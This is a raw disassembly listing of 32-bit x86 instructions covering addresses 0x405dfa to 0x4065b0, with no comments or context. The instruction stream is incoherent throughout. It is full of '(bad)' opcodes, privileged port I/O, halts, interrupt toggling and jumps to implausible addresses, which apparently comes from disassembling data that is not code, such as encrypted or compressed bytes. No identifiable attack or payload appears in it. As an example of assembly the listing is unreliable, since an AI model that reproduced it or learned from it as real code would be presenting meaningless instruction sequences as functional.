  405dfa:	jnp    0x405db1
  405dfc:	mov    edi,edi
  405dfe:	fsubr  DWORD PTR [edx]
  405e00:	cmp    DWORD PTR [eax-0x2b],esp
  405e03:	lahf   
  405e04:	js     0x405dbd
  405e06:	mov    eax,DWORD PTR [eax]
  405e08:	mov    BYTE PTR [ebp+0x18d8742b],bl
  405e0e:	inc    edi
  405e0f:	outs   dx,DWORD PTR ds:[esi]
  405e10:	jne    0x405db4
  405e12:	push   eax
  405e13:	mov    ebp,0xed6cc30c
  405e18:	mov    dl,0x45
  405e1a:	aad    0x49
  405e1c:	fsubr  st(5),st
  405e1e:	test   eax,0xb5b999b6
  405e23:	sbb    bh,dh
  405e25:	sub    eax,0x707be28e
  405e2a:	outs   dx,DWORD PTR ds:[esi]
  405e2b:	mov    esp,0xc18d8c77
  405e30:	scas   eax,DWORD PTR es:[edi]
  405e31:	pop    ecx
  405e32:	pop    ebx
  405e33:	adc    eax,0xab1c84fd
  405e38:	dec    ecx
  405e39:	bound  ebp,QWORD PTR [edi]
  405e3b:	mov    edi,0x2e2d1839
  405e40:	pop    esp
  405e41:	outs   dx,DWORD PTR ds:[esi]
  405e42:	loop   0x405e61
  405e44:	xor    bl,BYTE PTR [esi+0x41]
  405e47:	add    bh,cl
  405e49:	repnz test al,0x85
  405e4c:	imul   eax,esi,0xffffffbb
  405e4f:	bound  ecx,QWORD PTR [esi-0x4]
  405e52:	out    dx,al
  405e53:	sbb    ch,BYTE PTR [ebx]
  405e55:	dec    esi
  405e56:	or     eax,0x13cfc26d
  405e5b:	or     ebp,edi
  405e5d:	push   es
  405e5e:	or     al,0x3a
  405e60:	mov    al,ds:0x32330377
  405e65:	rcr    ch,0xaa
  405e68:	dec    esp
  405e69:	xor    al,0x4a
  405e6b:	sub    eax,0xee7f3b03
  405e70:	add    bl,bl
  405e72:	sbb    ah,dl
  405e74:	xor    DWORD PTR [esi+eax*4],ecx
  405e77:	add    DWORD PTR [ebp+0x3a599c3c],edx
  405e7d:	adc    eax,DWORD PTR [edx-0x10]
  405e80:	xor    DWORD PTR [eax-0x2c4dafb],0xba996bc8
  405e8a:	and    ah,BYTE PTR [edi-0x2095b1ef]
  405e90:	sti    
  405e91:	in     al,dx
  405e92:	sbb    BYTE PTR [esi-0x48],0x43
  405e96:	mov    ebp,0xd6858902
  405e9b:	mov    ecx,0x8012ee60
  405ea0:	sbb    al,0x5d
  405ea2:	out    0x78,eax
  405ea4:	xor    eax,ecx
  405ea6:	(bad)  
  405ea7:	je     0x405ef8
  405ea9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405eaa:	mov    cl,0xc3
  405eac:	ss std 
  405eae:	ret    0xf86c
  405eb1:	and    eax,0x8faf6a60
  405eb6:	sahf   
  405eb7:	sti    
  405eb8:	aad    0x80
  405eba:	loop   0x405ea5
  405ebc:	jle    0x405eb8
  405ebe:	in     eax,0x4b
  405ec0:	pusha  
  405ec1:	jno    0x405eed
  405ec3:	sub    bl,BYTE PTR [ecx+eax*4]
  405ec6:	or     eax,0xb679e34e
  405ecb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405ecc:	lods   al,BYTE PTR ds:[esi]
  405ecd:	add    DWORD PTR [ecx+0x4a],eax
  405ed0:	pop    edx
  405ed1:	mov    eax,0x9863cdb8
  405ed6:	sub    DWORD PTR [edi],esp
  405ed8:	mov    esp,ecx
  405eda:	clc    
  405edb:	inc    eax
  405edc:	adc    esp,0x5e7d2665
  405ee2:	jbe    0x405ed4
  405ee4:	jmp    0xe230658b
  405ee9:	lods   eax,DWORD PTR ds:[esi]
  405eea:	mov    ecx,0xf3d6401e
  405eef:	pushf  
  405ef0:	pop    esi
  405ef1:	cmc    
  405ef2:	mov    ch,0x12
  405ef4:	or     BYTE PTR [edx+ebp*4+0x55],bl
  405ef8:	hlt    
  405ef9:	mov    edx,0x859498e3
  405efe:	xor    eax,0x515758bd
  405f03:	jb     0x405eae
  405f05:	jbe    0x405f56
  405f07:	leave  
  405f08:	mov    bl,0x74
  405f0a:	mov    ah,0xd5
  405f0c:	fndisi(8087 only) 
  405f0e:	es push ds
  405f10:	out    0xfa,al
  405f12:	sbb    eax,0x8d5aeb08
  405f17:	mov    bl,0x5b
  405f19:	xchg   edi,eax
  405f1a:	retf   0x64a1
  405f1d:	lahf   
  405f1e:	or     DWORD PTR [eax],edi
  405f20:	ret    
  405f21:	aaa    
  405f22:	(bad)  
  405f24:	mov    ds:0x2d4643db,eax
  405f29:	icebp  
  405f2a:	(bad)  
  405f2b:	xor    ah,dl
  405f2d:	push   esi
  405f2e:	cld    
  405f2f:	inc    esi
  405f30:	dec    esi
  405f31:	sahf   
  405f32:	outs   dx,DWORD PTR ds:[esi]
  405f33:	mov    al,ds:0x7a5822d8
  405f38:	adc    DWORD PTR [edi-0x28cc2510],esp
  405f3e:	xor    cl,bh
  405f40:	in     eax,0x52
  405f42:	out    0xbe,al
  405f44:	ret    
  405f45:	push   ecx
  405f46:	js     0x405f1b
  405f48:	mov    edx,0x1d60dce5
  405f4d:	test   al,0x7f
  405f4f:	repnz lock in eax,0x5f
  405f53:	push   edx
  405f54:	int3   
  405f55:	jo     0x405f95
  405f57:	jns    0x405f31
  405f59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405f5a:	mov    WORD PTR [ecx+0x3e21584e],ds
  405f60:	jae    0x405fbd
  405f62:	js     0x405f6d
  405f64:	ror    BYTE PTR [eax+edx*1],cl
  405f67:	cli    
  405f68:	sbb    eax,0x8cb232d8
  405f6d:	in     al,dx
  405f6e:	cld    
  405f6f:	lds    edi,FWORD PTR [edi]
  405f71:	fisubr WORD PTR [ebx-0x4edaf056]
  405f77:	int    0xde
  405f79:	call   0x1d5cccdc
  405f7e:	addr16 iret 
  405f80:	fucom  st(1)
  405f82:	xor    dl,BYTE PTR [edi+0x5fedac8b]
  405f88:	test   BYTE PTR [eax+0x15d02c8b],al
  405f8e:	cs pop eax
  405f90:	mov    ch,0x97
  405f92:	lahf   
  405f93:	loopne 0x405f3d
  405f95:	sbb    al,0x7e
  405f97:	addr16 mov ebp,0x62566106
  405f9d:	sahf   
  405f9e:	cmp    cl,dh
  405fa0:	xor    edi,edi
  405fa2:	add    ch,cl
  405fa4:	pusha  
  405fa5:	xor    eax,0x59eef2fd
  405faa:	mov    ecx,0x753855fe
  405faf:	out    0x2,al
  405fb1:	fsubr  QWORD PTR [esi-0x63b4c15f]
  405fb7:	sub    al,0xa3
  405fb9:	out    dx,al
  405fba:	push   esi
  405fbb:	pop    es
  405fbc:	inc    DWORD PTR [edi]
  405fbe:	jecxz  0x405fc4
  405fc0:	loopne 0x405fb6
  405fc2:	cmp    bh,al
  405fc4:	push   0x9b28806f
  405fc9:	xor    eax,DWORD PTR [esi+0x7212b4da]
  405fcf:	imul   edx,DWORD PTR [edi-0x1ea89a00],0xb2365bd7
  405fd9:	shl    DWORD PTR [ebx],1
  405fdb:	xchg   al,bl
  405fdd:	arpl   sp,di
  405fdf:	sahf   
  405fe0:	jge    0x405fba
  405fe2:	sbb    BYTE PTR [edi],0x33
  405fe5:	xor    BYTE PTR [esi-0x5d52522d],0x42
  405fec:	mov    DWORD PTR [edx+0x1fd136ab],ebp
  405ff2:	add    DWORD PTR [ebx],edx
  405ff4:	or     eax,0x60c6aebf
  405ff9:	inc    ebp
  405ffa:	int    0xbb
  405ffc:	imul   ecx,edx,0x29
  405fff:	stos   DWORD PTR es:[edi],eax
  406000:	dec    esp
  406001:	mov    edx,0x83711d92
  406006:	int3   
  406007:	xchg   edi,eax
  406008:	push   0x93a4bc9b
  40600d:	jmp    0xa1c888e8
  406012:	dec    esp
  406013:	mov    ds:0x9ff619d8,eax
  406018:	loopne 0x40604b
  40601a:	mov    ds:0xfe48360c,al
  40601f:	mov    eax,ds:0x6e2c83b8
  406024:	and    al,0xdc
  406026:	aaa    
  406027:	fdivr  QWORD PTR [ecx+edi*2]
  40602a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40602b:	popf   
  40602c:	loopne 0x4060a0
  40602e:	(bad)  
  406030:	and    eax,0xa9f1b539
  406035:	shl    BYTE PTR [edx],0xb7
  406038:	imul   ecx,DWORD PTR [edi-0x32],0x8821b175
  40603f:	test   DWORD PTR [ebx],ebx
  406041:	and    ebx,DWORD PTR [ecx]
  406043:	mov    WORD PTR [edx],es
  406045:	das    
  406046:	mov    ch,0xb3
  406048:	xor    BYTE PTR [edx-0x2b8224c1],al
  40604e:	retf   
  40604f:	bound  esp,QWORD PTR [eax+eiz*2+0x75]
  406053:	cmp    al,0xe
  406055:	inc    esi
  406056:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406057:	outs   dx,DWORD PTR ds:[esi]
  406058:	popf   
  406059:	mov    ch,0xef
  40605b:	add    al,0x7c
  40605d:	int3   
  40605e:	sbb    al,BYTE PTR [ebx+0x28078fe0]
  406064:	and    esi,edi
  406066:	mov    BYTE PTR [edx],dh
  406068:	xor    BYTE PTR [ecx+edi*4-0x68f3b1bb],bh
  40606f:	push   ss
  406070:	out    0x2b,eax
  406072:	(bad)  
  406074:	dec    edi
  406075:	jg     0x406075
  406077:	cmp    eax,0xa9974c16
  40607c:	popf   
  40607d:	push   eax
  40607e:	jge    0x40604a
  406080:	lock xchg ecx,eax
  406082:	in     al,0x1d
  406084:	retf   
  406085:	inc    edx
  406086:	jmp    0x406057
  406088:	jno    0x4060c4
  40608a:	add    eax,0xd501ac7f
  40608f:	fdivr  QWORD PTR [edi+esi*8+0x727eacf4]
  406096:	jg     0x4060a9
  406098:	push   ss
  406099:	or     DWORD PTR [ebp+ebp*4+0x55fa5a64],0xe1cff7b7
  4060a4:	jbe    0x4060a6
  4060a6:	inc    ebp
  4060a7:	push   edi
  4060a8:	lods   al,BYTE PTR ds:[esi]
  4060a9:	enter  0xb8ae,0x71
  4060ad:	mov    cl,0x76
  4060af:	data16 xchg BYTE PTR [edx-0x6446d6e7],bh
  4060b6:	jl     0x4060f4
  4060b8:	mov    ah,0x7b
  4060ba:	popf   
  4060bb:	xor    edx,esp
  4060bd:	fnstsw WORD PTR [edi+0x7e7fd406]
  4060c3:	nop
  4060c4:	xor    al,BYTE PTR [ebx+0x6]
  4060c7:	jecxz  0x406112
  4060c9:	adc    ebp,DWORD PTR [edi]
  4060cb:	hlt    
  4060cc:	aaa    
  4060cd:	(bad)  
  4060d0:	inc    eax
  4060d1:	out    dx,al
  4060d2:	push   ecx
  4060d3:	sbb    al,0x8d
  4060d5:	xor    al,0x4c
  4060d7:	popa   
  4060d8:	mov    eax,0x25990e79
  4060dd:	xchg   edi,eax
  4060de:	sbb    eax,0xa1402db4
  4060e3:	rcr    BYTE PTR [ebx+0xc],1
  4060e6:	mov    ds:0xa7daa5d1,al
  4060eb:	fstp   DWORD PTR [ebx-0x20]
  4060ee:	pop    ebp
  4060ef:	inc    esi
  4060f0:	lods   eax,DWORD PTR ds:[esi]
  4060f1:	mov    ebp,0xdebd43d4
  4060f6:	dec    edx
  4060f7:	push   ebp
  4060f8:	push   ecx
  4060f9:	and    eax,0xe3b93839
  4060fe:	pushf  
  4060ff:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406100:	add    BYTE PTR [esi],ah
  406102:	adc    bh,0xca
  406105:	cmp    esi,ebx
  406107:	mov    dh,0x4f
  406109:	outs   dx,BYTE PTR ds:[esi]
  40610a:	xchg   esp,eax
  40610b:	cmp    DWORD PTR [ecx-0x59],eax
  40610e:	mov    ds:0x9ab2d362,eax
  406113:	aad    0x55
  406115:	daa    
  406116:	cli    
  406117:	shr    BYTE PTR [ecx],cl
  406119:	js     0x4060bc
  40611b:	or     bl,bl
  40611d:	push   eax
  40611e:	xor    DWORD PTR [esi+0x78],ebx
  406121:	les    esp,FWORD PTR [eax-0x6f]
  406124:	push   0xffffffc8
  406126:	arpl   WORD PTR [eax],sp
  406128:	rcr    al,1
  40612a:	into   
  40612b:	dec    eax
  40612c:	test   dl,dh
  40612e:	ins    DWORD PTR es:[edi],dx
  40612f:	(bad)  
  406130:	enter  0xe195,0xfa
  406134:	fcomp  DWORD PTR [edx-0xb]
  406137:	jb     0x406195
  406139:	stc    
  40613a:	dec    esi
  40613b:	adc    BYTE PTR [eax+0x75],ah
  40613e:	xor    DWORD PTR [edi+0x6fe519ef],esp
  406144:	arpl   WORD PTR [ebx+eax*1],bx
  406147:	jg     0x406133
  406149:	inc    ebx
  40614a:	gs repnz popf 
  40614d:	out    0xc2,al
  40614f:	fsubr  QWORD PTR [ecx+0x49]
  406152:	lea    edi,[edi]
  406154:	push   es
  406155:	pop    edi
  406156:	(bad)  
  406157:	clc    
  406158:	mov    dl,0xfc
  40615a:	shl    DWORD PTR [ebx+ebx*2-0x740de4c7],cl
  406161:	dec    esi
  406162:	outs   dx,DWORD PTR ds:[esi]
  406163:	mov    esi,0xaefcfb1
  406168:	stos   BYTE PTR es:[edi],al
  406169:	movs   WORD PTR es:[edi],WORD PTR ds:[esi]
  40616b:	not    BYTE PTR [ecx+0x155ba9f0]
  406171:	mov    bl,0x8c
  406173:	sbb    cl,BYTE PTR [edx]
  406175:	sbb    BYTE PTR [edi+0x56],ah
  406178:	outs   dx,BYTE PTR ds:[esi]
  406179:	or     BYTE PTR ds:0xcc31bed0,0xbf
  406180:	push   ecx
  406181:	sub    edx,DWORD PTR [edx+0x54]
  406184:	dec    ebp
  406185:	sbb    ah,BYTE PTR [ecx]
  406187:	out    0xbe,eax
  406189:	pusha  
  40618a:	xchg   ebp,eax
  40618b:	js     0x4061b7
  40618d:	in     eax,0xdd
  40618f:	sub    esi,ebx
  406191:	test   eax,0x52609862
  406196:	or     DWORD PTR [ebp+0x7faae532],ecx
  40619c:	mov    BYTE PTR [edx-0x19],0xba
  4061a0:	sub    ah,BYTE PTR [edi]
  4061a2:	sbb    al,0x7c
  4061a4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4061a5:	hlt    
  4061a6:	inc    ecx
  4061a7:	jno    0x4061c3
  4061a9:	inc    esi
  4061aa:	mov    eax,esi
  4061ac:	adc    BYTE PTR [edx-0xf],bl
  4061af:	add    DWORD PTR [ebp+ebx*8-0x31],ebp
  4061b3:	jge    0x40613a
  4061b5:	arpl   WORD PTR [edx-0x4],cx
  4061b8:	clc    
  4061b9:	push   ebx
  4061ba:	jo     0x4061b9
  4061bc:	add    esi,esp
  4061be:	data16 es sahf 
  4061c1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4061c2:	into   
  4061c3:	mov    ah,0x8d
  4061c5:	test   DWORD PTR [ebp+0x5838fc9b],edi
  4061cb:	iret   
  4061cc:	push   cs
  4061cd:	pop    ebp
  4061ce:	dec    eax
  4061cf:	xor    dh,0x54
  4061d2:	rcr    BYTE PTR [ebx],1
  4061d4:	xor    BYTE PTR [edi],0xba
  4061d7:	imul   BYTE PTR [edx]
  4061d9:	jmp    0x8d4efd6f
  4061de:	cmp    cl,BYTE PTR [edx-0x75]
  4061e1:	fld    DWORD PTR [edi+0x58321dab]
  4061e7:	(bad)  
  4061e8:	int    0xbb
  4061ea:	mov    bl,0x2b
  4061ec:	jg     0x4061e8
  4061ee:	(bad)  [edi+0x2eb6cafd]
  4061f4:	xchg   DWORD PTR [eax-0x1323e306],esp
  4061fa:	pop    esp
  4061fb:	leave  
  4061fc:	pop    ebp
  4061fd:	(bad)  
  4061fe:	(bad)
  406201:	leave  
  406202:	sub    DWORD PTR [ebx-0x341f52bb],edi
  406208:	std    
  406209:	mov    ecx,ebx
  40620b:	add    esi,edi
  40620d:	es pop ds
  40620f:	addr16 dec ecx
  406211:	aam    0x62
  406213:	shr    dh,1
  406215:	mov    ebp,ebx
  406217:	mov    ds:0x22b19c19,al
  40621c:	pop    esp
  40621d:	ss adc al,0x48
  406220:	sbb    ecx,ebp
  406222:	bnd jae 0x406274
  406225:	mov    ?,WORD PTR [ebp-0x7dd4a34]
  40622b:	mov    ds:0xc6b31d32,al
  406230:	or     dh,al
  406232:	hlt    
  406233:	clc    
  406234:	js     0x4061e8
  406236:	test   BYTE PTR [esp+edx*1-0x3eabc7b3],0x45
  40623e:	add    DWORD PTR [edx],ebx
  406240:	daa    
  406241:	add    esp,DWORD PTR [esi-0x71460bdc]
  406247:	adc    al,0x7d
  406249:	mov    ch,0xf4
  40624b:	xor    BYTE PTR [edx+0x64],dl
  40624e:	loopne 0x40627e
  406250:	in     al,0x4e
  406252:	in     al,dx
  406253:	aad    0xbc
  406255:	cmp    eax,0xe06df1cb
  40625a:	or     DWORD PTR [ebx-0x14],esp
  40625d:	stc    
  40625e:	dec    eax
  40625f:	ins    BYTE PTR es:[edi],dx
  406260:	gs js  0x406204
  406263:	arpl   WORD PTR [ebp+0x2f],cx
  406266:	and    al,0xa8
  406268:	addr16 je 0x406252
  40626b:	pop    ecx
  40626c:	fadd   DWORD PTR [ebx]
  40626e:	add    BYTE PTR [eax+0x38],ah
  406271:	ret    
  406272:	sbb    eax,0x90f5c43a
  406277:	shl    BYTE PTR [ecx+0x6e],1
  40627a:	in     al,0x6d
  40627c:	nop
  40627d:	loopne 0x4062df
  40627f:	push   eax
  406280:	add    al,0x13
  406282:	jbe    0x406232
  406284:	mov    ch,0x50
  406286:	repnz ins BYTE PTR es:[edi],dx
  406288:	push   0xe
  40628a:	inc    ebp
  40628b:	pop    ds
  40628c:	and    eax,edx
  40628e:	clc    
  40628f:	adc    dh,BYTE PTR [eax+0xd]
  406292:	fwait
  406293:	test   al,0x15
  406295:	dec    esi
  406296:	adc    eax,0xf55ce35b
  40629b:	xor    eax,0x908728c6
  4062a0:	xchg   BYTE PTR [ecx+0x65922513],al
  4062a6:	and    dl,BYTE PTR [ecx-0x55]
  4062a9:	xor    eax,0x3659d765
  4062ae:	call   0x62:0xc86e8393
  4062b5:	cmc    
  4062b6:	popa   
  4062b7:	xor    al,0xa3
  4062b9:	pop    edi
  4062ba:	(bad)  
  4062bb:	or     al,0x9f
  4062bd:	mov    dh,0x56
  4062bf:	push   eax
  4062c0:	adc    ebx,esp
  4062c2:	aas    
  4062c3:	pop    ds
  4062c4:	in     al,0x56
  4062c6:	fiadd  WORD PTR [ecx-0x2b]
  4062c9:	aam    0x1d
  4062cb:	dec    ebx
  4062cc:	popf   
  4062cd:	imul   esi,DWORD PTR [ebp-0x29],0x63
  4062d1:	xchg   ebp,eax
  4062d2:	js     0x40629d
  4062d4:	and    cl,cl
  4062d6:	sbb    edi,ebp
  4062d8:	xchg   ebx,eax
  4062d9:	xor    edx,esi
  4062db:	test   ah,bl
  4062dd:	jnp    0x4062bb
  4062df:	push   ebp
  4062e0:	daa    
  4062e1:	inc    edi
  4062e2:	and    DWORD PTR [ebx+0x5fef39b7],0xbe4d88b3
  4062ec:	dec    BYTE PTR [eax]
  4062ee:	inc    ebp
  4062ef:	push   0xffffffd9
  4062f1:	imul   eax,DWORD PTR [ecx+0x6ca15d6d],0x17
  4062f8:	lds    edx,FWORD PTR [esi]
  4062fa:	shl    DWORD PTR ds:0xd7f1e315,1
  406300:	jno    0x4062dd
  406302:	add    al,0x31
  406304:	fild   WORD PTR [edx+0x31]
  406307:	es sbb eax,0xb61a7a75
  40630d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40630e:	(bad)  
  40630f:	or     DWORD PTR [ebx+eax*4],0xf
  406313:	div    ah
  406315:	ins    BYTE PTR es:[edi],dx
  406316:	xchg   edx,eax
  406317:	gs int 0x93
  40631a:	sbb    BYTE PTR [ebx+0x35],dh
  40631d:	cmp    eax,0xd5cd42c5
  406322:	dec    edi
  406323:	mov    edx,0x64bc4ef2
  406328:	cs out dx,al
  40632a:	mov    ds:0xe20b74d5,al
  40632f:	loopne 0x406342
  406331:	scas   al,BYTE PTR es:[edi]
  406332:	or     eax,0x1222cedb
  406337:	xor    dl,BYTE PTR [eax]
  406339:	xchg   ebx,eax
  40633a:	dec    ecx
  40633b:	push   ebp
  40633c:	iret   
  40633d:	sub    cl,BYTE PTR [eax-0x2c]
  406340:	clc    
  406341:	mov    dl,0x84
  406343:	adc    cl,al
  406345:	push   ebx
  406346:	jle    0x4062e7
  406348:	xchg   edx,eax
  406349:	mov    esp,0x3ceeb0ce
  40634e:	pop    ecx
  40634f:	xchg   esp,eax
  406350:	loope  0x4062d4
  406352:	mov    edx,0xbb30dd5d
  406357:	out    dx,al
  406358:	test   BYTE PTR [ebx+edi*8+0x4],bh
  40635c:	sbb    al,bh
  40635e:	test   eax,0x6ef0e55a
  406363:	das    
  406364:	adc    BYTE PTR [eax-0x3af40abd],cl
  40636a:	sar    BYTE PTR [edx+0x164cebc2],1
  406370:	or     eax,0x850a4b7b
  406375:	inc    esp
  406376:	rcr    bh,0xb5
  406379:	jae    0x4062fe
  40637b:	mov    ds:0x2aad654c,al
  406380:	push   ds
  406381:	cmp    BYTE PTR [esi+0x49],dl
  406384:	rcr    BYTE PTR [ebx+0x34],cl
  406387:	pop    ds
  406388:	ins    BYTE PTR es:[edi],dx
  406389:	sbb    bh,ch
  40638b:	push   eax
  40638c:	xchg   ecx,eax
  40638d:	mov    ah,0xaa
  40638f:	mov    edx,0x9df884e1
  406394:	pushf  
  406395:	idiv   BYTE PTR [edi+0x372e7863]
  40639b:	bound  edx,QWORD PTR [esi]
  40639d:	pop    ss
  40639e:	dec    edx
  40639f:	addr16 pop ebp
  4063a1:	lea    edx,[edi+0x58]
  4063a4:	inc    edi
  4063a5:	sbb    cl,dl
  4063a7:	out    dx,eax
  4063a8:	xchg   ebp,eax
  4063a9:	push   ecx
  4063aa:	int3   
  4063ab:	ss inc esp
  4063ad:	(bad)  
  4063ae:	adc    eax,0xea6d3074
  4063b3:	pop    es
  4063b4:	out    dx,eax
  4063b5:	call   FWORD PTR [edi-0x4f]
  4063b8:	sbb    esi,DWORD PTR [edi+0x91161c1]
  4063be:	pop    ebx
  4063bf:	gs (bad) 
  4063c2:	es aas 
  4063c4:	mov    ds:0x45dcf8f8,al
  4063c9:	push   ebx
  4063ca:	adc    eax,0x7a4bd20f
  4063cf:	(bad)  
  4063d0:	repnz inc ecx
  4063d2:	sub    BYTE PTR [edx-0x1e],0xc9
  4063d6:	xchg   BYTE PTR [edi],ah
  4063d8:	stos   BYTE PTR es:[edi],al
  4063d9:	xchg   edx,eax
  4063da:	cmp    BYTE PTR fs:[edx],0xb
  4063de:	xchg   ebp,eax
  4063df:	in     al,0xa5
  4063e1:	jnp    0x4063f9
  4063e3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4063e4:	popa   
  4063e5:	sub    eax,DWORD PTR [eax+0x11687e09]
  4063eb:	lods   al,BYTE PTR ds:[esi]
  4063ec:	stos   BYTE PTR es:[edi],al
  4063ed:	test   eax,0x8f43d102
  4063f2:	cwde   
  4063f3:	lods   eax,DWORD PTR ds:[esi]
  4063f4:	inc    esi
  4063f5:	mov    DWORD PTR [esi],ebp
  4063f7:	add    esp,DWORD PTR [ecx-0x76]
  4063fa:	popf   
  4063fb:	lods   eax,DWORD PTR ds:[esi]
  4063fc:	in     al,dx
  4063fd:	xchg   DWORD PTR [eax+0x278756c6],esi
  406403:	imul   esp,esp,0xffffffad
  406406:	outs   dx,BYTE PTR ds:[esi]
  406407:	jp     0x40644a
  406409:	add    BYTE PTR [ebp+ecx*1+0x12],cl
  40640d:	push   esi
  40640e:	jmp    0x4063ba
  406410:	sti    
  406411:	and    al,0xdd
  406413:	cmp    edx,0x6b
  406416:	or     ebx,ebp
  406418:	or     ch,BYTE PTR fs:[eax-0x74]
  40641c:	imul   ecx,DWORD PTR [ebx+0x58],0xffffffe8
  406420:	ror    DWORD PTR [esi-0x63],cl
  406423:	mov    cl,BYTE PTR [edx-0x26]
  406426:	push   esp
  406427:	shl    BYTE PTR [ebx-0x5c],cl
  40642a:	cmp    esp,esp
  40642c:	xchg   BYTE PTR [eax+0x51],ah
  40642f:	jnp    0x40643c
  406431:	mov    eax,0x41dd8348
  406436:	cmp    BYTE PTR [esi-0xf],dl
  406439:	ja     0x406422
  40643b:	repnz dec edi
  40643d:	shr    BYTE PTR [ecx+0x39],cl
  406440:	pop    ds
  406441:	fsubr  QWORD PTR [esi-0xc]
  406444:	clc    
  406445:	loop   0x4063fc
  406447:	rcr    BYTE PTR [ecx],0x8b
  40644a:	fs inc ecx
  40644c:	and    eax,0xf2d278d7
  406451:	cli    
  406452:	ret    0x2730
  406455:	lea    esi,[eax]
  406457:	daa    
  406458:	mov    ax,di
  40645b:	stos   BYTE PTR es:[edi],al
  40645c:	shl    DWORD PTR [edi+eiz*8+0x50],cl
  406460:	push   0xe33e2c4c
  406465:	ret    0x5d7d
  406468:	ins    BYTE PTR es:[edi],dx
  406469:	push   ds
  40646a:	call   0xb71e9fd4
  40646f:	enter  0xcbc7,0xe1
  406473:	in     al,dx
  406474:	ret    
  406475:	xor    bl,BYTE PTR [ebp*1+0x2817b57d]
  40647c:	push   cs
  40647d:	pop    ebp
  40647e:	lds    edx,FWORD PTR [ebx+0x20374440]
  406484:	adc    cl,cl
  406486:	xor    BYTE PTR [esp+edx*8],bh
  406489:	test   eax,0x23d52f8d
  40648e:	(bad)  
  40648f:	adc    al,0x47
  406491:	call   DWORD PTR [ebx+0x398c26e4]
  406497:	pop    ebx
  406498:	cmp    edx,DWORD PTR [ecx+0x3e2a1956]
  40649e:	test   BYTE PTR [ebx],0x9b
  4064a1:	sbb    bl,BYTE PTR [ecx-0x7e]
  4064a4:	push   esp
  4064a5:	(bad)  
  4064a6:	xor    DWORD PTR [esi+ebx*4],ecx
  4064a9:	xchg   ebp,eax
  4064aa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4064ab:	or     edi,DWORD PTR [eax]
  4064ad:	push   0x3c
  4064af:	fsubr  DWORD PTR [ecx-0x2b]
  4064b2:	mov    ds:0x1a9e5ee2,eax
  4064b7:	leave  
  4064b8:	mov    ds:0x339b6092,al
  4064bd:	int3   
  4064be:	cld    
  4064bf:	adc    al,0xc4
  4064c1:	ret    0x7537
  4064c4:	(bad)  
  4064c5:	sub    ch,dh
  4064c7:	das    
  4064c8:	cli    
  4064c9:	fsub   QWORD PTR [ecx]
  4064cb:	or     bh,BYTE PTR ds:0x6d8232b5
  4064d1:	in     eax,dx
  4064d2:	test   al,0x0
  4064d4:	ss xchg esp,eax
  4064d6:	mov    ch,0x17
  4064d8:	mov    ds:0xa018b32b,al
  4064dd:	sbb    BYTE PTR [ebp+0x1a],al
  4064e0:	xor    dl,BYTE PTR [ecx+0x57]
  4064e3:	push   ds
  4064e4:	dec    esp
  4064e5:	(bad)  
  4064e6:	jmp    0xa8daaeea
  4064eb:	scas   eax,DWORD PTR es:[edi]
  4064ec:	out    0xb7,al
  4064ee:	lods   al,BYTE PTR ds:[esi]
  4064ef:	xor    edi,DWORD PTR [esi-0x1121ecf]
  4064f5:	inc    edx
  4064f6:	pop    ebx
  4064f7:	jb     0x4064aa
  4064f9:	call   0xb3408b4f
  4064fe:	xor    BYTE PTR [esi],bl
  406500:	cmp    eax,0xfae12996
  406505:	je     0x4064cf
  406507:	mov    dh,0x24
  406509:	add    esi,eax
  40650b:	(bad)  
  40650d:	push   edi
  40650e:	jg     0x40650b
  406510:	cs cmp al,0x3e
  406513:	pushf  
  406514:	idiv   DWORD PTR [eax+0x1e18749d]
  40651a:	add    al,0xc2
  40651c:	and    al,0x97
  40651e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40651f:	fstp   TBYTE PTR [ecx-0x29a26df]
  406525:	or     al,0x7e
  406527:	pop    es
  406528:	pop    ss
  406529:	stos   DWORD PTR es:[edi],eax
  40652a:	mov    eax,0x458c7130
  40652f:	or     cl,BYTE PTR [edx+0x6a64d4cc]
  406535:	sbb    eax,0x919a10e0
  40653a:	xor    al,0xe6
  40653c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40653d:	scas   al,BYTE PTR es:[edi]
  40653e:	ds dec ecx
  406540:	jmp    0xa945206f
  406545:	adc    esi,esi
  406547:	mov    bh,0xef
  406549:	jbe    0x406512
  40654b:	xchg   esi,eax
  40654c:	ret    
  40654d:	shr    BYTE PTR [ebx],0x88
  406550:	push   0x2406d087
  406555:	pop    ebx
  406556:	xchg   esp,eax
  406557:	jae    0x4065ac
  406559:	gs xchg ecx,eax
  40655b:	mov    al,ds:0xe404de8f
  406560:	ins    DWORD PTR es:[edi],dx
  406561:	daa    
  406562:	(bad)  
  406563:	fsub   QWORD PTR [ecx+0x75]
  406566:	adc    al,0xc6
  406568:	shr    BYTE PTR [esi-0x53],1
  40656b:	fdiv   QWORD PTR [eax]
  40656d:	mov    dh,0xc7
  40656f:	dec    ecx
  406570:	xchg   eax,ebx
  406572:	mov    cl,BYTE PTR [eax-0x32]
  406575:	xchg   edi,eax
  406576:	scas   eax,DWORD PTR es:[edi]
  406577:	jle    0x406528
  406579:	jnp    0x406582
  40657b:	mov    esi,0xb7e36e81
  406580:	pushf  
  406581:	imul   ecx,DWORD PTR [ebx-0x4b],0xffffffb7
  406585:	mov    BYTE PTR [edi],cl
  406587:	mov    bl,0xe
  406589:	std    
  40658a:	jge    0x40651c
  40658c:	test   BYTE PTR [ebp-0x7fbb6070],0xe3
  406593:	pop    esp
  406594:	mov    esi,0x1c254f23
  406599:	repz mov esi,0x9bd35abd
  40659f:	cs mov esp,0xa1bebdea
  4065a5:	cmp    al,0x3d
  4065a7:	pop    edi
  4065a8:	push   esp
  4065a9:	ins    DWORD PTR es:[edi],dx
  4065aa:	out    dx,al
  4065ab:	and    cl,BYTE PTR [ebx-0x6c]
  4065ae:	sbb    cl,cl
  4065b0:	ror    bh,cl
